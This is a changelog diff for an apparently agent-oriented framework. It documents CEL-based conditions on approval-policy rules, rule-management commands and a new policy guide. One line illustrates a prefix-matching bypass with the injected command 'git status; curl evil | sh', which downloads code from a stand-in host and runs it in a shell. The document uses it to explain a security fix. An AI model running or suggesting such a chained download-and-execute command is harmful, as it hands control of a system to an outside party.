@@ -6,6 +6,73 @@ All notable changes to the Lisa Framework will be documented in this file.
 
 ### Added
 
+#### CEL `when` expressions for policy rules + `/policy rule` management
+
+- **What:** Policy rules gain an optional `when` field — a
+  [CEL](https://github.com/google/cel-spec) boolean expression evaluated
+  against an activation exposing `action.*` (`tool`, `effect`, `pack`,
+  `command`, `argv`, `parameters`), `identity.*` (`workspace_id`, `user_slug`,
+  `surface_id`, `surface_type`, `mode_id`, `memory_scope`), and
+  `containment`. All present matchers AND the expression must hold; a
+  `when`-only rule is valid. `argv` exposes the command tokens (the `argv`
+  parameter when present, else `shlex.split` of the command string), which
+  closes the `command_prefix` bypass — `command_prefix: git status` matches
+  `git status; curl evil | sh` (plain startswith), while
+  `action.argv[0] == "git" && action.argv.size() <= 2` does not. The engine
+  (`host/policy.py`) caches compiled programs by expression text (the policy
+  file is re-read on every approval request, so compilation must be cached),
+  compile-checks every expression at load via the new
+  `load_policy_with_errors` (a non-compiling expression fails the whole
+  document to ask-mode defaults, mirroring corrupt-YAML fail-closed), and
+  short-circuits evaluation errors to `ask` — never skipping the rule, the
+  deliberate inversion of the model router's skip-and-continue (a skipped
+  deny would be an allowed `rm`). Documents without `when` rules pay zero
+  extra I/O per decision (the containment fact is read only when some rule
+  has a `when`). `host/pyproject.toml` declares `cel-python>=0.5.0` directly
+  (already in the tree transitively via the SDK's router). `/policy` renders
+  expressions, per-rule remove addresses (`list:n`), and a load-errors
+  section (the discovery surface for a broken expression — policy has no
+  `/models apply` gate); new `/policy rule add <list> [--tool T] [--effect E]
+  [--pack P] [--prefix PX] [--when EXPR]`, `/policy rule remove <list>:<n>`,
+  and `/policy rule list` subcommands manage rules from any transport
+  (flag parsing is case-preserving; `--when` takes the raw remainder and
+  strips one whole-expression shell quote while leaving inner string
+  literals verbatim; the expression is compile-checked before the write so a
+  bad add is rejected instead of poisoning the document). `/help` updated;
+  the duplicated dead `policy` help block in `host/commands/_render.py` was
+  removed (a dict literal cannot carry two identical keys — the first was
+  unreachable).
+- **Why:** The structural matchers cannot express negation, token
+  membership, identity scoping, or parameter conditions — each would need a
+  new dedicated key — and `command_prefix` is bypassable by shell
+  metacharacters. The model router already established the CEL idiom in this
+  codebase (`sdk/router/router.py`, `cel-python` in the tree); the policy
+  reuses the mechanics with inverted error semantics because policy failure
+  must fail closed. Rule management had no in-host surface beyond hand-editing
+  YAML.
+- **Tests:** `host/tests/test_policy.py` (when-matching, AND semantics,
+  argv-token bypass regression, eval-error→ask, compile-error→fail-closed
+  load, round-trip serialization, containment/identity bindings, compile
+  cache, zero-I/O guarantee for expression-free documents); `host/tests/
+  test_policy_command.py` (rule add/remove/list, compile-check rejection
+  without write, case preservation, quoting probe, out-of-range and bad
+  addresses, render with expressions and load errors).
+
+#### Approval Policy Guide (`docs/POLICY_GUIDE.md`)
+
+- **What:** New authoring reference for `config/policy.yaml`: file location
+  and data-dir resolution, the full key table (`mode`, `sandbox_downgrade`,
+  `bare_requires_approval`, rule lists), rule matcher semantics (AND within a
+  rule, deny → ask → allow first-match), the fixed decision ladder with the
+  sandbox downgrade and bare-mode guard, containment states, runtime
+  management surfaces (`/policy`, `/approve --remember`), and fail-closed
+  behavior. Links the engine (`host/policy.py`) and tests as canonical.
+- **Why:** Policy documentation lived only in docstrings, the generated file
+  header, and tests — there was no durable guide for hand-authoring the file.
+  Also fixes a stale docstring path in `host/policy.py` (the sandbox fact
+  lives at `run/<session_key>/sandbox-facts.json`, matching the bash pack
+  writer and reader).
+
 #### `/last` — verbatim replay of a previous response
 
 - **What:** New host command `/last [N]` reprints a previous turn's response
